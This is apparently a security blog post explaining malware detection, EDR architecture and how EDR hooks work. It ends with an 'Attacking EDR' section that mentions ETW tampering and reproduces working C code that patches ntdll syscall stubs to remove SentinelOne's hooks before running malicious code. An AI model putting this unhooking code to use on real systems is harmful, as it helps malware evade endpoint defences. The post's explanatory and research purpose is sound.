---
layout: attack
title: Understanding and Attacking EDRs 
---

<img height="150" align="left" src="/images/attacking_edr.jpg"> In this article you can learn how malware detection is working in a traditional approach used by Antivirus Software. Next I will guide you into the functionality of modern EDR software solutions and perform a deep dive into the way how EDR hooks are working before we start to find ways how to attack an EDR solution based on a threat model.

- [Malware Detection 101](#malware-detection-101)
  - [Signature-Based Detections](#signature-based-detections)
    - [Strengths](#strengths)
    - [Weaknesses](#weaknesses)
  - [Heuristic-Based Detections](#heuristic-based-detections)
    - [Strengths](#strengths-1)
    - [Weaknesses](#weaknesses-1)
- [EDR](#edr)
- [How do EDRs working under the Hood?](#how-do-edrs-working-under-the-hood)
    - [Process Hooking and Monitoring:](#process-hooking-and-monitoring)
    - [Network Traffic Analysis:](#network-traffic-analysis)
    - ["Machine Learning and AI":](#machine-learning-and-ai)
- [What makes EDR better than traditional Antivirus ?](#what-makes-edr-better-than-traditional-antivirus-)
    - [Behavioral Analysis:](#behavioral-analysis)
    - [Real-time Response and Remediation:](#real-time-response-and-remediation)
    - [Threat Hunting and Forensics:](#threat-hunting-and-forensics)
    - [Continuous Monitoring and Advanced Analytics:](#continuous-monitoring-and-advanced-analytics)
    - [Integration and Automation:](#integration-and-automation)
    - [Adaptability to Evolving Threats:](#adaptability-to-evolving-threats)
- [Process Hooking and Monitoring](#process-hooking-and-monitoring-1)
    - [API Hooking:](#api-hooking)
    - [Kernel Hooking:](#kernel-hooking)
    - [Hardware Breakpoints:](#hardware-breakpoints)
      - [Windows Process Flow](#windows-process-flow)
  - [WinAPI Call](#winapi-call)
- [How are EDR Hooks working ?](#how-are-edr-hooks-working-)
  - [Userland vs Kernelland](#userland-vs-kernelland)
  - [EDR Hooking visualized](#edr-hooking-visualized)
- [Attacking EDR](#attacking-edr)
  - [(Partially) Blinding EDR by attacking ETW logs](#partially-blinding-edr-by-attacking-etw-logs)
  - [Unhooking EDRs](#unhooking-edrs)


## Malware Detection 101

### Signature-Based Detections
**What does this mean:** Utilizes known patterns or 'signatures' of malware to identify and block malicious software.

**How to do it**: Compares files against a database of known malware signatures

Signatures can be gathered or evaluated using VirusTotal, and normally consist of different hash values, while MD5 is the most common format:
![](/images/vt_hash_values_mimikatz.png)

#### Strengths
* **High Accuracy for Known Malware:** Very effective at
detecting and stopping known threats.
* **Efficiency:** Fast and resource-light, due to the
straightforward nature of matching signatures.

#### Weaknesses

* **Limited to Known Threats:** Cannot detect new, unknown
malware or variants of existing malware without the specific
signature.
* **Regular Updates Required:** Needs constant updates to the
signature database to remain effective

### Heuristic-Based Detections
**What does this mean:** Employs algorithms to identify suspicious behavior or
characteristics indicative of malware, rather than relying on known signatures.

**How to do it:** Analyzes behaviors and properties of files to identify potentially
malicious activities or anomalies.

MSFT Defender for instance is capable to find malware also based on heuristics by rolling up the processes and checking the behavior pattern:
![](/images/defender-heuristic.png)

#### Strengths 
* **Detects Unknown Malware:** Capable of identifying new or
modified malware that doesn't match any known signature.
* **Behavior Analysis:** Looks at how the software operates,
potentially catching malware designed to evade traditional
signature-based detection.

#### Weaknesses
* **Higher False Positives:** Cannot detect new, unknown
malware or variants of existing malware without the specific
signature.
* **Resource Intensive:** Requires more processing power and
memory, as it analyzes behaviors in real-time or through
sandboxing.

## EDR
An EDR solution is built out of the following components:
1. **EDR Agent**: Is an application that controls and consumes data from sensor components, performs some basic analysis to determine whether a given activity or series of events aligns with attacker behavior, and forwards the telemetry to the main server, which further analysis events from all agents deployed in an environment.
2. **Telemetry**: Every sensor in an EDR servers a common purpose: the collection of telemetry. Roughly defined, telemetry is the raw data generated by a sensor component or the host itself, and defenders can analyze it to determine whether malicious activity has occurred. Every action on the system, from opening a file to creating a new process, generates some form of telemetry. This information becomes a data point in the EDR product internal alert logic.
3. **Sensors**: If telemetry represents the blips on the radar, then sensors are the transmitter, duplexer, and receiver or in other words the components responsible for detecting objects and turning them into blips. Whereas radar systems constantly ping objects to track their movements, EDR sensors work a bit more passively by intercepting data lowing through an internal process, extracting information, and forwarding it to the central agent.
4. **Detections**: Simply put, detections are the logic that correlates discrete pieces of telemetry with some behavior performed on the system. A detection can check for a singular condition (for example, the presence of a file that matches the hash of known malware) or complex sequence of events coming from many different sources like child process of chrome.exe was spawned and then started communication over TCP port 88 with the domain controller.

With this in mind we can now take a look on a more generic architecture picture showcasing an EDR solution based on a Windows operating system:
![](/images/EDR-Architecture.PNG)


## How do EDRs working under the Hood? 
EDR solutions typically operate through a combination of techniques. Process hooking and monitoring allow them to scrutinize system calls and operations, providing insights into the behavior of applications and services on the endpoint. Simultaneously, these solutions analyze network traffic to and from the endpoint, identifying potentially malicious communications such as command and control or data exfiltration attempts. To detect novel threats, many EDRs leverage machine learning models that learn from historical data and identify patterns indicative of malicious behavior.

As a list it can be summarized into:  

#### Process Hooking and Monitoring:
Process hooking techniques to monitor system calls and operations, providing visibility into the actions of applications and services on the endpoint.

#### Network Traffic Analysis:
Analyze network traffic to and from endpoints, identifying suspicious communications that may indicate command and control (C2) activity or data exfiltration attempts.

#### "Machine Learning and AI":
EDRs claims to leverage "machine learning models" to detect novel threats by learning from historical data and identifying patterns that suggest malicious behavior. A typical representation of this is for example [Charlotte](https://www.crowdstrike.com/platform/charlotte-ai/) and [NGAV - Next-Generation Antivirus](https://www.crowdstrike.com/cybersecurity-101/endpoint-security/next-generation-antivirus-ngav/) from CrowdStrike.

## What makes EDR better than traditional Antivirus ?

#### Behavioral Analysis:
EDR uses behavioral analysis to detect anomalies and suspicious activities, identifying threats without prior knowledge of their signatures.

#### Real-time Response and Remediation:
EDR provides real-time monitoring and response tools, allowing for immediate action (e.g., isolating an endpoint) to mitigate threats.

#### Threat Hunting and Forensics:
EDR tools include features for threat hunting and forensic analysis, enabling detailed investigation of how a breach occurred and the scope of the impact.

#### Continuous Monitoring and Advanced Analytics:
EDR ensures continuous monitoring of all endpoints, utilizing advanced analytics and machine learning to detect sophisticated threats.

#### Integration and Automation:
EDR can integrate with other security tools (SIEM, SOAR, etc.), enhancing overall security posture through automation and coordinated defense strategies.

#### Adaptability to Evolving Threats:
EDR platforms are designed to evolve, incorporating new intelligence and adapting to
changing threat landscapes

But the core feature is still missing! You might guessed it already **HOOKS** which will be discussed in the next section.

## Process Hooking and Monitoring 
EDRs are conducting various types of techniques to achieve hooking into the process and observe if the process itself is malicious or benign. The most common types are discussed below:

#### API Hooking:
* **Inline Hooking**: Insert a jump instruction into the beginning of a target function in memory. When the function is called, execution is redirected to the EDR's monitoring function before returning control to the original function. This allows EDRs to inspect or modify the call's parameters and return value.
* **Import Address Table (IAT) Hooking:** Targets the IAT of a process, which is used to resolve addresses of dynamically linked functions from DLLs. By modifying the IAT entries, EDRs can intercept and examine calls to critical system APIs.

#### Kernel Hooking:
* **System Service Descriptor Table (SSDT) Hooking:** Involves modifying the SSDT, which the Windows kernel uses to handle system call requests. By redirecting system calls to their monitoring functions, EDRs can observe and potentially block malicious activities.
* **Object Manager Hooks:** Utilize the Windows Object Manager to monitor access to system objects like files,
registry keys, and processes, providing a mechanism for behavioral analysis beyond what user-space API
hooking can offer.

#### Hardware Breakpoints:
Utilize the CPU's debug registers to monitor access to specific memory addresses. This technique can be used to detect when specific code sequences are executed or when particular data is accessed, with minimal performance impact. 

**How to tackle this**: Take a look into the Anti-Debugging Post I made earlier to get some ideas, how to let an EDR jump into various other section that are benign and used to lower entropy. To read this article click [here](https://benjitrapp.github.io/attacks/2024-08-01-anti-debugging/)

To Understand Hooking better we now need to take a look on a few more topics first. A great way to learn about the Windows System Architecture can be found in [Pavel’s Windows Kernel Programming Book](https://leanpub.com/windowskernelprogrammingsecondedition), nevertheless this pictures summarizes the architecture very well: 

![](/images/pavel_windows_kernel_programming.png)

##### Windows Process Flow
In Windows operating systems, a process flow refers to the sequence of steps that an executable takes from its
initiation to termination. This involves several stages, as shown in the next list.

* **Process Creation**: Initiated by system calls such as `CreateProcess`, `NtCreateProcess`, or by higher-level
mechanisms like shell commands. The Windows Loader (`ntdll.dll`) is then involved in loading the executable into
memory, resolving DLL dependencies, and setting up the initial thread.
* **Execution**: The process executes its code, which can involve a variety of operations such as file I/O, network
communication, memory management, and interaction with other processes or system components. This
execution is managed by the Windows Scheduler, handling context switching and resource allocation.
* **Termination**: A process can terminate normally (e.g., completing its task or through a call to `ExitProcess`) or
abnormally (e.g., killed by another process or due to an unhandled exception

### WinAPI Call
The example below contains a call to a WinAPI
function, like `CreateProcess`, directly in its code.

When the program is compiled, the linker resolves
this function call to the Windows DLL that
contains `CreateProcess` (e.g., `kernel32.dll`), and
the call is made explicitly when the program runs.

EDR systems can easily identify such calls and
hook into these statically linked calls to monitor
for malicious activity.

![](/images/winapi_call_demo.png)

## How are EDR Hooks working ?
Since we now learned about the Windows Architecture, the Windows Process flow and how WinAPI calls are looking like we need to next learn about user- and kernel land to fully get an understanding about EDR hooks.

### Userland vs Kernelland
Userland and kernelland represent distinct operating system environments. Userland houses applications and processes with limited system access, where most EDR functionalities reside, such as process monitoring, network analysis, and behavioral analysis. Kernel land, on the other hand, is the core of the operating system with unrestricted access, where certain EDR components might operate for deeper system visibility, enhanced performance, and protection against advanced threats. While Userland EDR offers a good balance, kernel-level EDR provides deeper protection but requires careful development. Many modern EDR solutions combine both approaches for comprehensive security.

As a picture it looks like this. Please also take a look at `ntdll.dll`as a core component to traverse from one environment to another:

![](/images/user-kernel-land.png)

### EDR Hooking visualized
As already mentioned above, `ntdll.dll` is the core component responsible for the transition between Userland and Kernelland. The picture below describes how this happens:

![](/images/edr_hooking.png)

As a contrast to the high level picture above, the following low level picture can help to get a deeper understanding of a hook:

![](/images/edr_hook_debugger.png)

What you see here is a syscall stub. A syscall stub is a piece of code that serves as a template or a bridge for making system calls (syscalls) from user space to kernel space. When a user-mode application calls a Windows API function that needs to perform an operation requiring kernel privileges (like accessing the file system or managing processes), it doesn't call the kernel directly. Instead, it goes through a syscall stub.

**Purpose and Functionality** 
* **Abstraction:** Syscall stubs abstract the details of switching from user mode to kernel mode, making it easier
for developers to utilize system services without dealing with the complexities of mode switching.
* **Transition Mechanism:** They provide the necessary instructions to safely transition the execution context
from user mode to kernel mode. This involves preparing the CPU registers with the appropriate syscall
number and arguments, and then executing a special instruction (like syscall on x64 architectures) that
switches the processor to kernel mode to execute the kernel-side code.
* **Standardization:** Syscall stubs standardize the way syscalls are made across different versions of
Windows, even though the underlying syscall numbers and implementations may change

The stub itself looks like this:
![](/images/syscall_stub.png)

* `mov eax, 23:` This is a syscall instruction in which we are setting the [EAX register](https://keleshev.com/eax-x86-register-meaning-and-history/) with a HEXADECIMAL value
"23" which is for `NtOpenProcess` WinAPI Call
* `SYSCALL:` This instruction will redirect the flow from userland to kernel lan


## Attacking EDR
There are various ways to attack EDR Solutions. This chapter will be filled while I'm learning. 

### (Partially) Blinding EDR by attacking ETW logs
EDRs require ETW (or ULS on MacOS) to enrich it's telemetry. Since this can be manipulated in the User Space, this can help to at least partially blind the deployed EDR solution. 

### Unhooking EDRs 
A good way to bypass EDRs is to unhook the EDRs hook. A good way to do this can be found for example in Mr-Uni1K0d3r's RedTeamCCode Repository on GitHub ([Source](https://github.com/Mr-Un1k0d3r/RedTeamCCode/blob/main/unhook_sentinelone_64.c) of the code below). Example to unhook SentinelOne:

```c
#include <Windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

VOID PatchHook(CHAR* address, unsigned char id, char high);

VOID CleanUp() {
    HANDLE hDll = LoadLibrary("ntdll.dll");

    FARPROC NtProtectVirtualMemory = GetProcAddress(hDll, "NtProtectVirtualMemory");

    PatchHook(NtProtectVirtualMemory, 0x50, 0x00);  // unhooking first since we are going to need it to unhook APIs

    CloseHandle(hDll);
}

VOID PatchHook(CHAR* address, unsigned char id, char high) {
    DWORD dwSize = 11;
    CHAR* patch_address = address;
    //\x4c\x8b\xd1\xb8\xXX\xHH\x00\x00\x0f\x05\xc3
    CHAR patch[dwSize];
    sprintf(patch, "\x4c\x8b\xd1\xb8%c%c%c%c\x0f\x05\xc3", id, high, high ^ high, high ^ high);

    DWORD dwOld;
    VirtualProtect(patch_address, dwSize, PAGE_EXECUTE_READWRITE, &dwOld);
    memcpy(patch_address, patch, dwSize);
}

int main (int argc, char **argv) {
    CleanUp();

    // No More Hook From SentinelOne
    // Malicious Code

    return 0;
}
```
